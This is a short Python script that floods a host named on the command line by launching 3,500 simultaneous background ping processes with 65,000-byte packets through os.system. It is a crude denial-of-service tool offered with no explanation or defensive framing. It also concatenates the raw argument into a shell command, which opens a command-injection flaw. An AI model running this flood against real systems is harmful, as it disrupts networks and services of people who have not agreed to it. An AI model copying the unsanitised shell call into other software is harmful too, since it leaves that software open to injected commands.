import os
import sys

target = sys.argv[1]
size = 65000
procnum = 3500

i = 0
while(i < procnum):
	response = os.system("ping -s "+str(size)+" "+ target+" &")
	i = i + 1
